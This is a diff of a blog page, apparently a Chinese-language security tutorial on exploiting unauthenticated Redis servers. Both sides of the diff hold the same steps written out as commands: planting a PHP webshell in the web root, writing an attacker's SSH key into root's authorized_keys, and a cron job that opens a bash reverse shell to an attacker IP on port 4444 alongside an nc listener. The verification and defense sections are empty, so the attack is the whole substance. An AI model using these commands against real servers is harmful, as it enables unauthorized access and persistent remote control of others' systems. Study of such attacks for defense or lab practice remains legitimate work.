@@ -56,115 +56,52 @@
     </div>
   </header>
   <div class="article-content">
-    
-# redis未授权访问漏洞
-
-Redis默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。
-
-## 漏洞危害
-
-getshell
-
-
-
-## 验证方式
-
-## 漏洞利用
-
-### webshell写入
-
-目标机器同时启用了web服务
-
-1.连接redis数据库
-
-redis-cli -h IP
-
-2.设置web路径
-
-config set dir /var/www/html/
-
-3.设置shell文件名
-
-config set dbfilename phpinfo.php
-
-4.向数据库插入
-
-payload
-set payload " <? php phpinfo(); ?>"
-
-5.保存webshell
-
-save
-
-### ssh公钥写入
-
-目标机器同时开启了ssh
-
-攻击机公钥位置/root/.ssh/id_rsa.pub
-
-1.将攻击机的公钥写入到redis数据库
-
+    <h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p>Redis默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>getshell</p>
+<h2 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="webshell写入"><a href="#webshell写入" class="headerlink" title="webshell写入"></a>webshell写入</h3><p>目标机器同时启用了web服务</p>
+<p>1.连接redis数据库</p>
+<p>redis-cli -h IP</p>
+<p>2.设置web路径</p>
+<p>config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</p>
+<p>3.设置shell文件名</p>
+<p>config set dbfilename phpinfo.php</p>
+<p>4.向数据库插入</p>
+<p>payload<br>set payload “ <? php phpinfo(); ?>“</p>
+<p>5.保存webshell</p>
+<p>save</p>
+<h3 id="ssh公钥写入"><a href="#ssh公钥写入" class="headerlink" title="ssh公钥写入"></a>ssh公钥写入</h3><p>目标机器同时开启了ssh</p>
+<p>攻击机公钥位置&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</p>
+<p>1.将攻击机的公钥写入到redis数据库</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_ed25519.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) | redis-cli -h 192.168.234.143 -p 6379 -x <span class="built_in">set</span> payload</span><br></pre></td></tr></table></figure>
 
-2.连接目标的 Redis
-
-redis-cli -h 192.168.234.143
-
-3.将更改后的保存路径指向 root 的 SSH 目录
-
-config set dir /root/.ssh/
-
-4.将保存的文件名改成 SSH 的标准认证文件名
-
-config set dbfilename authorized_keys
-
-5.保存落盘，把内存里的公钥强行写入 /root/.ssh/authorized_keys
-
-save
-
-### 计划任务shell反弹
-
-前提：
-
-1.Redis未授权
-
-2.靶机必须为CentOS系统，原因：
-
-Ubuntu的计划任务对语法要求严格，Redis写入含有冗余字节，会导致执行错误
-
-Ubuntu默认使用dash而非bash，使用bash反弹shell不可行
-
-Ubuntu计划任务要求文件权限为600，Redis写入文件权限默认为644
-
-1.在攻击机上打开监听
-
+<p>2.连接目标的 Redis</p>
+<p>redis-cli -h 192.168.234.143</p>
+<p>3.将更改后的保存路径指向 root 的 SSH 目录</p>
+<p>config set dir &#x2F;root&#x2F;.ssh&#x2F;</p>
+<p>4.将保存的文件名改成 SSH 的标准认证文件名</p>
+<p>config set dbfilename authorized_keys</p>
+<p>5.保存落盘，把内存里的公钥强行写入 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
+<p>save</p>
+<h3 id="计划任务shell反弹"><a href="#计划任务shell反弹" class="headerlink" title="计划任务shell反弹"></a>计划任务shell反弹</h3><p>前提：</p>
+<p>1.Redis未授权</p>
+<p>2.靶机必须为CentOS系统，原因：</p>
+<p>Ubuntu的计划任务对语法要求严格，Redis写入含有冗余字节，会导致执行错误</p>
+<p>Ubuntu默认使用dash而非bash，使用bash反弹shell不可行</p>
+<p>Ubuntu计划任务要求文件权限为600，Redis写入文件权限默认为644</p>
+<p>1.在攻击机上打开监听</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
 
-2.连接目标的redis
-
-redis-cli -h 192.168.234.143
-
-3.将更改后的保存路径指向计划任务目录
-
-config set dir /var/spool/cron
-
-4.将保存的文件名改成root
-
-config set dbfilename root
-
-5.写入反弹shell
-
-set payload "\n\n* * * * * bash -i >& /dev/tcp/192.168.243.3/4444 0>&1\n\n"
-
-5.保存落盘，把内存里的反弹强行写入/var/spool/cron
-
-save
-
-## 防御方式
-
-
-
-
+<p>2.连接目标的redis</p>
+<p>redis-cli -h 192.168.234.143</p>
+<p>3.将更改后的保存路径指向计划任务目录</p>
+<p>config set dir &#x2F;var&#x2F;spool&#x2F;cron</p>
+<p>4.将保存的文件名改成root</p>
+<p>config set dbfilename root</p>
+<p>5.写入反弹shell</p>
+<p>set payload “\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.243.3&#x2F;4444 0&gt;&amp;1\n\n”</p>
+<p>5.保存落盘，把内存里的反弹强行写入&#x2F;var&#x2F;spool&#x2F;cron</p>
+<p>save</p>
+<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2>
   </div>
 </article>
 
